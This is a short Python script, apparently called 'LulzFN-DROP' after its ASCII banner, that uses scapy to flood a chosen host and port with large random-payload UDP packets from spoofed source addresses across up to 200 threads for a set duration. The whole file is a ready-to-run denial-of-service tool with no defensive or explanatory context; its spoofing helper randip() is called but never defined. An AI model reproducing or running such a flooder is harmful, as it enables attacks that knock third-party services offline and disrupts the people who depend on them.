import threading, sys, os, time
from random import randint
from scapy.all import *

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:
            ip = IP(src=randip(), dst=host)
            udp = UDP(sport=RandShort(),dport=int(port))
            raw = Raw(os.urandom(15000))
            send(ip/udp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$$ /$$   /$$         /$$$$$$$  /$$$$$$$   /$$$$$$  /$$$$$$$ 
            | $$                | $$          | $$_____/| $$$ | $$        | $$__  $$| $$__  $$ /$$__  $$| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$      | $$$$| $$        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/| $$$$$   | $$ $$ $$ /$$$$$$| $$  | $$| $$$$$$$/| $$  | $$| $$$$$$$/
            | $$      | $$  | $$| $$   /$$$$/ | $$__/   | $$  $$$$|______/| $$  | $$| $$__  $$| $$  | $$| $$____/ 
            | $$      | $$  | $$| $$  /$$__/  | $$      | $$\  $$$        | $$  | $$| $$  \ $$| $$  | $$| $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$      | $$ \  $$        | $$$$$$$/| $$  | $$|  $$$$$$/| $$      
            |________/ \______/ |__/|________/|__/      |__/  \__/        |_______/ |__/  |__/ \______/ |__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')